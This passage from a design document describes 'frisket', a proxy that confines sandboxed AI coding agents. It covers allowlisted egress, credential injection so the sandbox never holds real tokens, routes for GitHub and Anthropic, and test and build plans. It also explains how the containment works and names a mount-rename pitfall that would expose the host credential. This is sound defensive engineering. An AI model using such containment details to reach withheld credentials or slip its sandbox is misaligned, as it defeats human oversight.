  (GraphQL needs a login), and LFS is refused until it is measured.
- **Trusted's route is the whole host, every method**, like its
  `api.github.com`: a narrower `github.com` scope with the same token open on
  the API buys nothing, and release and archive downloads go through the same
  host.
- **Not a GitHub App.** Minted, per-repository, read-only installation tokens
  would narrow the credential itself, but push as a bot and need an App on
  every owner. The route's scope is the boundary; that stays a later option.
- **Not SSH.** Agent forwarding, destination-constrained keys and GitHub's SSH
  CAs are all per-user, never per-repository or read-only; terminating SSH
  would give what HTTPS already gives, with a second protocol to hold.

### Claude Code

- **Where:** `api.anthropic.com`, every method, the whole path, for now: the
  credential's own OAuth scopes are the narrowing, and the paths Claude Code
  uses are to be measured from the request log before any are refused.
  `mcp-proxy.anthropic.com` (claude.ai connectors) takes the same credential
  where a policy wants connectors. Remote Control's hosts are unmeasured.
- **The credential** is the host's own login, `~/.claude/.credentials.json`,
  read with `credentialJSON` at `claudeAiOauth.accessToken`, expiring at
  `claudeAiOauth.expiresAt`. Past that, 503 (decision 10).
- **The sandbox** holds a placeholder with the same shape and an expiry far in
  the future, so its Claude Code never tries a refresh of its own, and trusts
  frisket's CA through `NODE_EXTRA_CA_CERTS`, which the adapter exports.
- **Its `~/.claude` is its own.** The host's cannot be mounted with the
  credential covered by a bind: a host session refreshes by temp-file and
  rename, and a rename over a mountpoint detaches the mount in every other
  namespace, uncovering the real file. What a sandbox shares of `~/.claude`
  is picked, entry by entry, and never the directory.
- **Who refreshes** is still the host (open question 1): its own sessions, and
  where none is running, a keep-alive of the consumer's that runs the host's
  Claude Code before the token expires. frisket still holds no login.

---

## Build order

**Built: the base capability, proven end to end.** Steering both sets with
TPROXY, the daemon and its sessions across restarts, and the flong adapter;
egress with the structural classifier, `Dialer.Control` and the session's
resolved set; DNS with the allowlist; and interception with a CA per session,
name-constrained to its policy's route hosts and mounted into the sandbox,
leaves minted per name, and routes adding a credential from a host file on the
wire — as a bearer token, a bare header or Basic's password — or holding a
scope with no credential at all. The VM test shows the credential reach the
upstream and appear nowhere in the sandbox.

**Next: QUIC in `all`.** udp/443 is rejected, so QUIC clients fall back
to TCP at once; QUIC through frisket is a relay on a UDP listener bound on 443
per family, a flow per client and original destination, dialled through the
same `Dialer.Control` and resolved set as TCP, with idle timeouts and a
per-session cap. Measured: HTTP/3 through a capability-free holder of a
transparent socket works. Open: whether the per-address allowlist alone is
enough, or the Initial packet's SNI must be read — which needs a vetted QUIC
parser under decision 1's rule, not a hand-rolled one.

**Then the routes**, each designed on its own (see "Per-tool routes"), and
minting where one needs it.

**Agents.** Claude Code's route is built: `credentialJSON` reads the host's
rotating login, and its expiry answers 503. codex's is next, on the same shape.

**git.** Built: over HTTPS with gh's token in trusted, anonymous and read-only
in strict, measured in both tiers.

**Integration.** The adapter against nix-config's tiers, and the mounts that
target state removes.

---

## Flake

- `packages.default` — `buildGoModule`, a pinned `vendorHash`,
  `env.CGO_ENABLED = 0`.
- `nixosModules.default` — the daemon, with a `package` option defaulting to
  this flake's build, so importing the module is enough.
- `nixosModules.flong` — the adapter.
- `lib.steering` — the ruleset and the listener specification, as one attrset,
  for any launcher.
- `devShells.default` — go, gopls, golangci-lint.
- `checks` — the NixOS test, the package (`buildGoModule` runs `go test`), the
  tests again under `-race` (with cgo, for that check alone), `gofmt`, `go vet`,
  and both rulesets through `nft -c`. The Go version follows the oldest nixpkgs
  a consumer is expected to use.
- `formatter` — nixpkgs-fmt. `scripts/version.sh`, `VERSION` and the shellcheck
  gate follow flong.

The service runs as the credential owner, hardened, with `ProtectSystem=strict`
and nothing else reachable.

Sessions survive a restart through systemd's file-descriptor store: the
listeners are stashed with `FDSTORE=1` and a name carrying the session id, at
session creation rather than at shutdown, so a crash is covered too.
`FileDescriptorStoreMax=`, `NotifyAccess=main` and
`FileDescriptorStorePreserve=restart`. While PID 1 holds a copy, the sandbox's
namespace stays alive across the gap. Beside the listeners, under the same
name, is the session's record: a sealed memfd holding what root opened it with,
so the one store holds both and there is no second place to disagree with it.
The successor matches each listener to its spec by what the kernel says the
socket is, and refuses a group that does not add up. A namespace-held listener
cannot be reopened
from a path, so this is the only way a `nixos-rebuild switch` does not sever a
session that has been running for hours — and teardown must drop the store entry
as well as close the descriptors.

---

## Test plan

**Go tests.** Unit tests, fuzz targets and property-based tests, because most of
this is a parser or a classifier facing hostile input:

- Fuzz the DNS handling and the ClientHello peek — the two places that parse
  bytes the sandbox chose.
- Property tests for the address classifier (a refusal is never turned into an
  acceptance by any allowlist; every spelling of an address classifies as the
  address), the allowlist matcher (`evil-google.com` never matches
  `*.google.com`; case, trailing dots and punycode; a `*` is accepted only
  alone or as a leading `*.`), and the splice (bytes are
  preserved in both directions, including after a half-close).
- The splice waits for both directions. Closing one must not truncate the other,
  which is a bug ottergate has in both of its proxy paths.
- Deadlines are idle deadlines, extended by activity, or long downloads, SSE and
  websockets die at the timeout.
- Logs are asserted through an injected writer. A logger that silences itself
  under test cannot be tested, and then "exactly one line per connection" is a
  hope.

**NixOS tests** with a fake upstream. Nothing needs a real credential or real
network; routes carry their upstream and CA bundle as configuration so a test
can point them at the fake, and the structural deny ranges are data so a test
node's address can be used.

- Steering, `all`: only `lo` and the dummy interface; a plain `curl` with no
  proxy settings is steered, allowed and logged; a raw connection to a private
  address is refused and logged; loopback, link-local and the host's own
  addresses are refused, including its global IPv6 address; UDP 443 is rejected;
  DNS reaches frisket; a name not allowed is NXDOMAIN and triggers no upstream
  lookup; a connection to an address frisket did not resolve is refused; the
  destination frisket logs matches what the client dialled, over both families.
- Steering, `service`: only DNS and the service address reach frisket.
- Ownership, as a regression gate rather than a measurement: the workload cannot
  list the ruleset, before or after `unshare -U`.
- Ordering: with egress deliberately delayed, every attempt before it fails and
  every attempt after it is steered — with no barrier in the sandbox.
- Listener integrity: a workload that has taken the port first makes session
  creation fail loudly rather than share it; a workload cannot take the port
  once frisket holds it; a direct connection to a listener is refused as
  unsteered.
- Lifecycle: closing a session frees its namespace (its nsfs inode becomes
  reusable); a session survives a daemon restart through the fd store.
- Credentials: the sandbox holds no credential, in its files or its processes'
  environments; the real one reaches the upstream in the placeholder's place,
  and any other credential goes as it was sent; an out-of-scope request is
  refused; a credential file replaced by
  rename is used; an SSE response arrives incrementally; a large upload
  streams. Each tool's route brings its own.
- Lifecycle: a session survives a daemon restart; a SIGKILLed launcher leaves
  nothing behind.

**Everywhere:** every connection and query produces exactly one log line.

---

## Required changes elsewhere

**flong** — generic, agent-agnostic, with a plan of its own in that
repository. What frisket uses from it: `postStart`, a root hook that runs
after the namespace exists with the ordering contract above; `postStop`, called
from both the clean and the killed path; `$leader`, whose mount namespace the
CA is mounted into; the container's `environment.variables`, which the
payload inherits, for the variables that point at the bundle; `path`, for the
tools the hooks run; the capability flags as defence in depth; and `network` —
pasta for a private session.

Three properties frisket depends on that are flong's to keep: the namespace is
owned by the initial user namespace, egress is provisioned last, and the
payload does not start until the hook returns.

**nix-config** — policy, and the mounts the target state removes:

- Define the policies and which sandbox gets which.
- Drop its own CA variables (`NODE_EXTRA_CA_CERTS`, `SSL_CERT_DIR`), which
  the adapter now sets (done).
- Handpick what each tier mounts. `~/.ssh` is gone (git over HTTPS, above) and
  so is the Claude login; `~/.codex` goes with codex's route; `cc-socks` stays
  for trusted and goes for strict; the askpass script belongs to the host tier
  alone.

Strict-tier hardening that is not frisket's concern, recorded so it is not lost:
the read-only workspace overlay, vanilla agents with only `projects/<slug>`
persisted, and an io_uring syscall filter. Note that flong refuses
`privateUsers` because a bind-mounted file owned by a host uid is unreadable
inside, which the credential binds going away does not change.

---

## Open questions

1. **Who refreshes when no host session is running.** frisket never refreshes,
   so a sandbox session stalls once the host's access token expires. Hold and
   answer 503 until a host session refreshes, fail visibly, or have frisket
   prompt a refresh through the host's own tooling.
2. **Which certificates cannot be intercepted.** The splice-through list needs
   to be discovered per tool, and a pinned client should fail in a way that says
   so.
3. **Inbound to a trusted sandbox.** A dev server inside a sandbox is reachable
   from inside it, and Playwright runs there, so this is only about reaching it
   from the host's own browser. Whether that is worth a forwarder.
4. **Hugging Face gated repos** — confirm the presigned CDN and Xet paths work
   as ordinary egress, and which hosts a strict allowlist needs.
5. **Which host ports a trusted policy allows**, and whether that list is
   per project.
6. **Where the credentials come from** for the routes that have no source yet:
   there is no gcloud installation and no Cloudflare login on this machine,
   and the Hugging Face token is outside sops.
7. **QUIC's policy.** Whether a relay's per-address allowlist is enough, or the
   Initial's SNI must be read (see "Build order").
